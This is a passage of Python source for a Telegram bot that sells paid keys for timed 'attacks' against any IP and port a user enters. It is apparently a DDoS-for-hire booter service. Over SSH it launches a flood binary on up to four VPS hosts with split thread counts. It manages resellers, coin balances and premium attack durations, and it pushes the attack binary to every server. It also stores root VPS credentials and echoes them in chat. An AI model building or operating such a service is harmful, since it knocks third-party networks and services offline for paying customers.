        key_type_needed = "private" if is_private else "group"
        await update.message.reply_text(
            f"❌ *You need a valid {key_type_needed} key to start an attack in this chat!*\n\n"
            f"🔑 *Buy keys from {current_display_name}*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

# Add this global variable at the top with other globals
ATTACK_HISTORY = {}  # Key: (ip, port), Value: attack count



async def attack_input(update: Update, context: CallbackContext):
    global last_attack_time, running_attacks

    args = update.message.text.split()
    if len(args) != 3:  # Now only 3 arguments (ip, port, duration)
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        await update.message.reply_text(
            f"❌ *Invalid input! Please enter <ip> <port> <duration>*\n\n"
            f"👑 *Bot Owner:* {current_display_name}\n"
            f"💬 *Need a key for 200s? DM:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    ip, port, duration = args  # Only 3 variables
    duration = int(duration)
    
    # Check busy VPS and available VPS
    busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    available_vps = [vps for vps in VPS_LIST[:ACTIVE_VPS_COUNT] if vps[0] not in busy_vps]
    
    # We can now use whatever VPS are available (minimum 1)
    if len(available_vps) == 0:
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        await update.message.reply_text(
            "❌ *No servers available! Try again later.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    # Use all available VPS (1-4)
    selected_vps = available_vps[:4]  # Still maximum 4 VPS
    
    # Set default threads
    user_id = update.effective_user.id
    is_special = False
    threads = MAX_THREADS  # Default threads for normal users
    
    if user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
            is_special = True
            threads = SPECIAL_MAX_THREADS  # Default threads for special key users
    
    if duration > max_duration and not is_special:
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        await update.message.reply_text(
            f"❌ *Attack duration exceeds 120 seconds!*\n"
            f"🔑 *For 200 seconds attacks, you need a special key.*\n\n"
            f"👑 *Buy keys from:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    max_allowed_duration = SPECIAL_MAX_DURATION if is_special else max_duration

    if duration > max_allowed_duration:
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        await update.message.reply_text(
            f"❌ *Attack duration exceeds the max limit ({max_allowed_duration} sec)!*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    last_attack_time = time.time()
    
    # Calculate threads per VPS based on available VPS count
    vps_count = len(selected_vps)
    threads_per_vps = threads // vps_count
    remaining_threads = threads % vps_count
    
    attack_id = f"{ip}:{port}-{time.time()}"
    
    attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    # Send attack started message with actual VPS count being used
    start_message = await update.message.reply_text(
        f"{attack_type}\n"
        f"🎯 *Target*: {ip}:{port}\n"
        f"🕒 *Duration*: {duration} sec\n"
        f"🧵 *Total Power*: {threads} threads\n"
        f"🖥️ *Using*: {vps_count} Squid Proxy Server{'s' if vps_count > 1 else ''}\n"
        f"👑 *Bot Owner:* {current_display_name}\n\n"
        f"🔥 *ATTACK STARTED! /running * 💥",
        parse_mode='Markdown'
    )

    def _run_ssh_attack(vps, threads_for_vps, attack_num, context):
        """Synchronous SSH attack function to be run in thread"""
        ip_vps, username, password = vps
        attack_id_vps = f"{attack_id}-{attack_num}"
        
        # Register this attack
        running_attacks[attack_id_vps] = {
            'user_id': user_id,
            'target_ip': ip,
            'start_time': time.time(),
            'duration': duration,
            'is_special': is_special,
            'vps_ip': ip_vps
        }
        
        ssh = None
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip_vps, username=username, password=password, timeout=10)
            
            # Set keepalive to prevent connection drops
            transport = ssh.get_transport()
            transport.set_keepalive(30)
            
            command = f"{BINARY_PATH} {ip} {port} {duration} {threads_for_vps}"
            stdin, stdout, stderr = ssh.exec_command(command, timeout=60)
            
            # Wait for command to complete or timeout
            start_time = time.time()
            while time.time() - start_time < duration + 10:
                if stdout.channel.exit_status_ready():
                    break
                time.sleep(1)
            
            logging.info(f"Attack finished on VPS {ip_vps}")
            
        except Exception as e:
            logging.error(f"SSH error on {ip_vps}: {str(e)}")
        finally:
            if ssh:
                try:
                    ssh.close()
                except:
                    pass
            
            # Remove from running attacks when done
            if attack_id_vps in running_attacks:
                del running_attacks[attack_id_vps]
            
            # Check if all attacks for this target are done
            active_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
            if not active_attacks:
                # All attacks finished for this target
                # Add 5-second countdown before sending finished notification
                def send_finished_notification():
                    # Sleep for 5 seconds before sending notification
                    time.sleep(5)
                    asyncio.run_coroutine_threadsafe(
                        context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"✅ *Attack Finished!*\n"
                                 f"🎯 *Target*: {ip}:{port}\n"
                                 f"🕒 *Duration*: {duration} sec\n"
                                 f"🧵 *Total Power*: {threads} threads\n"
                                 f"🖥️ *Used*: {vps_count} Server{'s' if vps_count > 1 else ''}\n"
                                 f"👑 *Bot Owner:* {current_display_name}\n\n"
                                 f"🔥 *ATTACK COMPLETED!*",
                            parse_mode='Markdown'
                        ),
                        context.bot.application.event_loop
                    )
                
                # Start the countdown in a separate thread
                threading.Thread(
                    target=send_finished_notification,
                    daemon=True
                ).start()

    try:
        # Start a thread for each selected VPS (1-4 VPS)
        for i, vps in enumerate(selected_vps):
            threads_for_vps = threads_per_vps + (1 if i < remaining_threads else 0)
            if threads_for_vps > 0:
                threading.Thread(
                    target=_run_ssh_attack,
                    args=(vps, threads_for_vps, i, context),
                    daemon=True
                ).start()
        
    except Exception as e:
        logging.error(f"Error starting attack threads: {str(e)}")
        await update.message.reply_text(
            f"❌ *Error starting attack!*\n"
            f"Error: {str(e)}\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END

async def check_vps_health(vps):
    """Check VPS health and return status"""
    ip, username, password = vps
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=10)
        
        # Check CPU load
        stdin, stdout, stderr = ssh.exec_command("uptime")
        uptime_output = stdout.read().decode()
        
        # Check memory
        stdin, stdout, stderr = ssh.exec_command("free -m")
        memory_output = stdout.read().decode()
        
        # Check bandwidth (simple check)
        stdin, stdout, stderr = ssh.exec_command("vnstat --short")
        bandwidth_output = stdout.read().decode()
        
        ssh.close()
        
        return {
            'status': 'online',
            'cpu_load': uptime_output.split()[-3] if uptime_output else 'unknown',
            'memory': memory_output.split('\n')[1].split()[1:3] if memory_output else ['unknown', 'unknown'],
            'bandwidth': bandwidth_output if bandwidth_output else 'unknown'
        }
    except Exception as e:
        return {
            'status': 'offline',
            'error': str(e)
        }

async def set_vps_count_input(update: Update, context: CallbackContext):
    global ACTIVE_VPS_COUNT
    
    user_id = update.effective_user.id
    try:
        count = int(update.message.text.strip())
        
        # Check authorization - owner can set any count up to total VPS
        if is_owner(update):
            max_allowed = len(VPS_LIST)
        # Co-owners have a fixed limit (adjust as needed)
        elif is_coowner(update):
            max_allowed = min(4, len(VPS_LIST))  # Example: max 4 for co-owners
        # Regular users can't change VPS count
        else:
            await update.message.reply_text(
                "❌ *Only owner or co-owners can configure VPS!*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        
        # Validate input
        if 1 <= count <= max_allowed:
            # Check health of selected VPS
            health_status = []
            for vps in VPS_LIST[:count]:
                status = await check_vps_health(vps)
                health_status.append(f"{vps[0]} - {status['status'].upper()}")
            
            ACTIVE_VPS_COUNT = count
            
            # Store user's preference if needed
            if is_owner(update) or is_coowner(update):
                USER_VPS_PREFERENCES[user_id] = count
            
            await update.message.reply_text(
                f"✅ *VPS Configuration Updated*\n"
                f"• Active VPS Count: *{count}*\n"
                f"• Max Allowed: *{max_allowed}*\n"
                f"• VPS Status:\n" + "\n".join(health_status),
                parse_mode='Markdown'
            )
            
            # Log this change
            logging.info(f"User {user_id} set VPS count to {count}")
            
        else:
            await update.message.reply_text(
                f"❌ *Invalid VPS Count*\n"
                f"You can only set between 1 and {max_allowed} VPS\n\n"
                f"*Current active VPS:* {ACTIVE_VPS_COUNT}",
                parse_mode='Markdown'
            )
            
    except ValueError:
        await update.message.reply_text(
            "❌ *Invalid Input*\nPlease enter a number between 1 and your max allowed VPS count",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error in set_vps_count_input: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "⚠️ *System Error*\nFailed to update VPS configuration",
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END
    
async def vps_health_check(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner or co-owners can check VPS health!", parse_mode='Markdown')
        return
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS configured!", parse_mode='Markdown')
        return
    
    message = await update.message.reply_text("🔄 Checking VPS health status...", parse_mode='Markdown')
    
    status_messages = []
    online_vps = 0
    offline_vps = 0
    
    for i, vps in enumerate(VPS_LIST):
        status = await check_vps_health(vps)
        
        if status['status'] == 'online':
            online_vps += 1
            status_msg = (
                f"🟢 *VPS {i+1} Status*\n"
                f"IP: `{vps[0]}`\n"
                f"CPU Load: {status['cpu_load']}\n"
                f"Memory: {status['memory'][0]}/{status['memory'][1]} MB\n"
                f"Bandwidth:\n`{status['bandwidth']}`\n"
            )
        else:
            offline_vps += 1
            status_msg = (
                f"🔴 *VPS {i+1} Status*\n"
                f"IP: `{vps[0]}`\n"
                f"Error: `{status['error']}`\n"
            )
        
        status_messages.append(status_msg)
    
    summary = (
        f"\n📊 *VPS Health Summary*\n"
        f"🟢 Online: {online_vps}\n"
        f"🔴 Offline: {offline_vps}\n"
        f"Total: {len(VPS_LIST)}\n\n"
        f"👑 *Bot Owner:* {get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)}"
    )
    
    full_message = summary + "\n\n" + "\n".join(status_messages)
    
    try:
        await message.edit_text(full_message, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error editing message: {e}")
        if len(full_message) > 4000:
            parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='Markdown')
        else:
            await update.message.reply_text(full_message, parse_mode='Markdown')

async def set_cooldown_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can set cooldown!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the global cooldown duration in seconds.*", parse_mode='Markdown')
    return GET_SET_COOLDOWN

async def set_cooldown_input(update: Update, context: CallbackContext):
    global global_cooldown

    try:
        global_cooldown = int(update.message.text)
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"✅ *Global cooldown set to {global_cooldown} seconds!*\n\n",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

async def show_keys(update: Update, context: CallbackContext):
    # ... existing code ...

    for key, key_info in keys.items():
        if key_info['expiration_time'] > current_time:
            remaining_time = key_info['expiration_time'] - current_time
            hours = int(remaining_time // 3600)
            minutes = int((remaining_time % 3600) // 60)
            
            generated_by_username = "Unknown"
            if key_info['generated_by']:
                try:
                    chat = await context.bot.get_chat(key_info['generated_by'])
                    generated_by_username = f"@{chat.username}" if chat.username else f"User ID: {chat.id}"
                except Exception:
                    generated_by_username = f"User ID: {key_info['generated_by']}"
                    
            key_type = "🔒 PRIVATE" if key_info.get('is_private', False) else "🔓 GROUP"
            active_keys.append(f"{key_type} `{escape_markdown(key, version=2)}` (By: {generated_by_username}, Expires in {hours}h {minutes}m)")

    # Similar updates for special_keys and redeemed_keys_info sections...

async def set_duration_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can set max attack duration!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum attack duration in seconds.*", parse_mode='Markdown')
    return GET_SET_DURATION

async def track_new_chat(update: Update, context: CallbackContext):
    """Track when the bot is added to a new chat"""
    chat = update.effective_chat
    
    # Initialize bot_data if not present
    if 'private_chats' not in context.bot_data:
        context.bot_data['private_chats'] = set()
    if 'group_chats' not in context.bot_data:
        context.bot_data['group_chats'] = set()
    
    # Add to appropriate set
    if chat.type == 'private':
        context.bot_data['private_chats'].add(chat.id)
    elif chat.type in ['group', 'supergroup']:
        context.bot_data['group_chats'].add(chat.id)

async def track_left_chat(update: Update, context: CallbackContext):
    """Track when the bot is removed from a chat"""
    chat = update.effective_chat
    
    # Remove from appropriate set if present
    if 'private_chats' in context.bot_data and chat.id in context.bot_data['private_chats']:
        context.bot_data['private_chats'].remove(chat.id)
    if 'group_chats' in context.bot_data and chat.id in context.bot_data['group_chats']:
        context.bot_data['group_chats'].remove(chat.id)


async def set_duration_input(update: Update, context: CallbackContext):
    global max_duration
    try:
        max_duration = int(update.message.text)
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"✅ *Maximum attack duration set to {max_duration} seconds!*\n\n",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

async def set_threads_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can set max threads!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum number of threads.*", parse_mode='Markdown')
    return GET_SET_THREADS

async def set_threads_input(update: Update, context: CallbackContext):
    global MAX_THREADS
    try:
        MAX_THREADS = int(update.message.text)
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"✅ *Maximum threads set to {MAX_THREADS}!*\n\n",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

async def delete_key_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can delete keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the key to delete.*", parse_mode='Markdown')
    return GET_DELETE_KEY

async def delete_key_input(update: Update, context: CallbackContext):
    key = update.message.text

    if key in keys:
        del keys[key]
        await update.message.reply_text(f"✅ *Key `{key}` deleted successfully!*", parse_mode='Markdown')
    elif key in special_keys:
        del special_keys[key]
        await update.message.reply_text(f"✅ *Special Key `{key}` deleted successfully!*", parse_mode='Markdown')
    elif key in redeemed_keys_info:
        user_id = redeemed_keys_info[key]['redeemed_by']
        if isinstance(redeemed_users.get(user_id), dict):
            del redeemed_users[user_id]
        else:
            del redeemed_users[user_id]
        del redeemed_keys_info[key]
        await update.message.reply_text(f"✅ *Redeemed key `{key}` deleted successfully!*", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ *Key not found!*", parse_mode='Markdown')

    save_keys()
    return ConversationHandler.END

async def add_reseller_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can add resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_RESELLER_ID

async def add_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text.strip()

    try:
        # Try to get user by username if input starts with @
        if user_id_str.startswith('@'):
            user = await context.bot.get_chat(user_id_str)
            user_id = user.id
        else:
            # Try to parse as ID
            user_id = int(user_id_str)
            
        if user_id not in resellers:
            resellers.add(user_id)
            reseller_balances[user_id] = reseller_balances.get(user_id, 0)
            save_resellers()  # Make sure this function exists and saves properly
            
            try:
                user = await context.bot.get_chat(user_id)
                username = f"@{user.username}" if user.username else "no username"
                await update.message.reply_text(
                    f"✅ *Reseller added successfully!*\n"
                    f"👤 User: {username}\n"
                    f"🆔 ID: `{user_id}`\n"
                    f"💰 Initial balance: 0 coins",
                    parse_mode='Markdown'
                )
            except:
                await update.message.reply_text(
                    f"✅ *Reseller added successfully!*\n"
                    f"🆔 ID: `{user_id}`\n"
                    f"💰 Initial balance: 0 coins\n\n"
                    f"ℹ️ Could not fetch username",
                    parse_mode='Markdown'
                )
        else:
            await update.message.reply_text(
                "ℹ️ *This user is already a reseller!*",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text(
            "❌ *Invalid input!*\n"
            "Please enter either:\n"
            "- A user ID (number)\n"
            "- Or a username starting with @",
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.message.reply_text(
            f"❌ *Error adding reseller!*\n"
            f"Error: {str(e)}",
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END

async def remove_reseller_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can remove resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller to remove.*", parse_mode='Markdown')
    return GET_REMOVE_RESELLER_ID

async def remove_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            resellers.remove(user_id)
            if user_id in reseller_balances:
                del reseller_balances[user_id]
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(f"✅ *Reseller with ID {user_id} removed successfully!*\n\n👑 *Bot Owner:*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END

    return ConversationHandler.END

async def add_coin_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can add coins!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_ADD_COIN_USER_ID

async def add_coin_user_id(update: Update, context: CallbackContext):
    user_id_str = update.message.text.strip()

    try:
        user_id = int(user_id_str)
        
        # First check if user_id is in resellers
        if user_id in resellers:
            context.user_data['add_coin_user_id'] = user_id
            await update.message.reply_text(
                "⚠️ *Enter the amount of coins to add.*",
                parse_mode='Markdown'
            )
            return GET_ADD_COIN_AMOUNT
        else:
            # Try to get the user by username if ID wasn't found
            try:
                # Check if input might be a username (starts with @)
                if user_id_str.startswith('@'):
                    user = await context.bot.get_chat(user_id_str)
                else:
                    # Try to get by username without @
                    user = await context.bot.get_chat('@' + user_id_str)
                
                if user.id in resellers:
                    context.user_data['add_coin_user_id'] = user.id
                    await update.message.reply_text(
                        "⚠️ *Enter the amount of coins to add.*",
                        parse_mode='Markdown'
                    )
                    return GET_ADD_COIN_AMOUNT
                else:
                    await update.message.reply_text(
                        f"❌ *User @{user.username} is not a reseller!*\n"
                        f"Use /addreseller first to make them a reseller.",
                        parse_mode='Markdown'
                    )
            except Exception as e:
                await update.message.reply_text(
                    f"❌ *Reseller not found!*\n"
                    f"Please make sure the user is already added as a reseller with /addreseller.\n"
                    f"Error: {str(e)}",
                    parse_mode='Markdown'
                )
            return ConversationHandler.END
            
    except ValueError:
        # Input is not a number, try to treat as username
        try:
            if not user_id_str.startswith('@'):
                user_id_str = '@' + user_id_str
            user = await context.bot.get_chat(user_id_str)
            
            if user.id in resellers:
                context.user_data['add_coin_user_id'] = user.id
                await update.message.reply_text(
                    "⚠️ *Enter the amount of coins to add.*",
                    parse_mode='Markdown'
                )
                return GET_ADD_COIN_AMOUNT
            else:
                await update.message.reply_text(
                    f"❌ *User @{user.username} is not a reseller!*\n"
                    f"Use /addreseller first to make them a reseller.",
                    parse_mode='Markdown'
                )
        except Exception as e:
            await update.message.reply_text(
                f"❌ *Invalid input!*\n"
                f"Please enter either:\n"
                f"- A reseller's user ID (number)\n"
                f"- Or their username (with or without @)\n\n"
                f"Error: {str(e)}",
                parse_mode='Markdown'
            )
        return ConversationHandler.END

async def add_coin_amount(update: Update, context: CallbackContext):
    amount_str = update.message.text

    try:
        amount = int(amount_str)
        user_id = context.user_data['add_coin_user_id']
        
        # Initialize balance if not exists
        if user_id not in reseller_balances:
            reseller_balances[user_id] = 0
            
        reseller_balances[user_id] += amount
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"✅ *Added {amount} coins to reseller {user_id}*\n"
            f"*New balance:* {reseller_balances[user_id]} coins\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ *Invalid amount! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END

    return ConversationHandler.END

async def balance(update: Update, context: CallbackContext):
    if not is_reseller(update):
        await update.message.reply_text("❌ *Only resellers can check their balance!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    balance = reseller_balances.get(user_id, 0)
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"💰 *Your current balance is: {balance} coins*\n\n",
        parse_mode='Markdown'
    )

async def handle_photo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in feedback_waiting:
        del feedback_waiting[user_id]
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            "✅ *Thanks for your feedback!*\n\n",
            parse_mode='Markdown'
        )

async def check_key_status(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    current_time = time.time()
    current_display_name = get_display_name(update.effective_chat.id)

    if user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict):
            if redeemed_users[user_id]['expiration_time'] <= current_time:
                status = "🔴 Expired"
            else:
                remaining_time = redeemed_users[user_id]['expiration_time'] - current_time
                days = int(remaining_time // 86400)
                hours = int((remaining_time % 86400) // 3600)
                status = f"🟢 Running ({days}d {hours}h remaining)"
            
            key_info = None
            for key, info in redeemed_keys_info.items():
                if info['redeemed_by'] == user_id and info.get('is_special'):
                    key_info = key
                    break
            
            await update.message.reply_text(
                f"🔍 *Special Key Status*\n\n"
                f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
                f"🆔 *ID:* `{user_id}`\n"
                f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
                f"⏳ *Status:* {status}\n"
                f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
                f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
                f"👑 *Bot Owner:* {current_display_name}",
                parse_mode='Markdown'
            )
        elif isinstance(redeemed_users[user_id], (int, float)):
            if redeemed_users[user_id] <= current_time:
                status = "🔴 Expired"
            else:
                remaining_time = redeemed_users[user_id] - current_time
                hours = int(remaining_time // 3600)
                minutes = int((remaining_time % 3600) // 60)
                status = f"🟢 Running ({hours}h {minutes}m remaining)"
            
            key_info = None
            for key, info in redeemed_keys_info.items():
                if info['redeemed_by'] == user_id:
                    key_info = key
                    break
            
            await update.message.reply_text(
                f"🔍 *Key Status*\n\n"
                f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
                f"🆔 *ID:* `{user_id}`\n"
                f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
                f"⏳ *Status:* {status}\n\n"
                f"👑 *Bot Owner:* {current_display_name}",
                parse_mode='Markdown'
            )
    else:
        await update.message.reply_text(
            f"🔍 *Key Status*\n\n"
            f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
            f"🆔 *ID:* `{user_id}`\n\n"
            f"❌ *No active key found!*\n"
            f"ℹ️ *Use the Redeem Key button to activate your access.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )

async def add_vps_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ Only owner, co-owners or resellers can add VPS!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "⚠️ Enter VPS details in format:\n\n"
        "<ip> <username> <password>\n\n"
        "Example: 1.1.1.1 root password123",
        parse_mode='Markdown'
    )
    return GET_VPS_INFO

async def add_vps_info(update: Update, context: CallbackContext):
    try:
        ip, username, password = update.message.text.split()
        VPS_LIST.append([ip, username, password])
        save_vps()
        
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"✅ VPS added successfully!\n\n"
            f"IP: `{ip}`\n"
            f"Username: `{username}`\n"
            f"Password: `{password}`\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid format! Please use:\n\n"
            "<ip> <username> <password>",
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END

async def remove_vps_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner or co-owners can remove VPS!", parse_mode='Markdown')
        return ConversationHandler.END
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS available to remove!", parse_mode='Markdown')
        return ConversationHandler.END
    
    vps_list_text = "\n".join(
        f"{i+1}. IP: `{vps[0]}`, User: `{vps[1]}`" 
        for i, vps in enumerate(VPS_LIST))
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ Select VPS to remove by number:\n\n{vps_list_text}\n\n",
        parse_mode='Markdown'
    )
    return GET_VPS_TO_REMOVE

async def remove_vps_selection(update: Update, context: CallbackContext):
    try:
        selection = int(update.message.text) - 1
        if 0 <= selection < len(VPS_LIST):
            removed_vps = VPS_LIST.pop(selection)
            save_vps()
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ VPS removed successfully!\n\n"
                f"IP: `{removed_vps[0]}`\n"
                f"Username: `{removed_vps[1]}`\n\n",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Invalid selection!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number!", parse_mode='Markdown')
    
    return ConversationHandler.END

async def upload_binary_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can upload binary!", parse_mode='Markdown')
        return ConversationHandler.END
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS available to upload binary!", parse_mode='Markdown')
        return ConversationHandler.END
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        "⚠️ Please upload the binary file you want to distribute to all VPS.\n\n"
        "The file will be uploaded to /home/master/ and made executable.\n\n",
        parse_mode='Markdown'
    )
    return CONFIRM_BINARY_UPLOAD

async def upload_binary_confirm(update: Update, context: CallbackContext):
    if not update.message.document:
        await update.message.reply_text("❌ Please upload a file!", parse_mode='Markdown')
        return ConversationHandler.END
    
    # Get the file
    file = await context.bot.get_file(update.message.document)
    file_name = update.message.document.file_name
    
    # Download the file locally first
    download_path = f"./{file_name}"
    await file.download_to_drive(download_path)
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    message = await update.message.reply_text(
        f"⏳ Starting {file_name} binary upload to all VPS...\n\n",
        parse_mode='Markdown'
    )
    
    success_count = 0
    fail_count = 0
    results = []
    
    for i, vps in enumerate(VPS_LIST):
        ip, username, password = vps
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            # Define the target directory (ONLY /home/master/)
            target_dir = "/home/master/"
            target_path = f"{target_dir}{file_name}"
            
            try:
                # Upload binary to /home/master/
                with SCPClient(ssh.get_transport()) as scp:
                    scp.put(download_path, target_path)
                
                # Make binary executable (chmod +x)
                ssh.exec_command(f'chmod +x {target_path}')
                
                # Verify upload
                stdin, stdout, stderr = ssh.exec_command(f'ls -la {target_path}')
                if file_name not in stdout.read().decode():
                    raise Exception("Upload verification failed")
                
                results.append(f"✅ {i+1}. {ip} - Success (Uploaded to {target_path})")
                success_count += 1
                
            except Exception as e:
                results.append(f"❌ {i+1}. {ip} - Failed: {str(e)}")
                fail_count += 1
            
            ssh.close()
            
        except Exception as e:
            results.append(f"❌ {i+1}. {ip} - Connection Failed: {str(e)}")
            fail_count += 1
    
    # Remove the downloaded file
    os.remove(download_path)
    
    # Send results
    result_text = "\n".join(results)
